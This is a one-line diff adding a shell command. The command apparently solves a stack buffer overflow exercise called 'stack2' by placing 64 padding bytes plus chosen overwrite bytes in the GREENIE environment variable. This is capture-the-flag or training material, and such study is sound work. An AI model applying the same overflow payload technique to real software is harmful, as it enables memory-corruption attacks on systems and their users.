@@ -1,0 +1,1 @@
+GREENIE=$(python -c "print('a' * 64 + '0a0d0a0d'.decode('hex'))") ./stack2
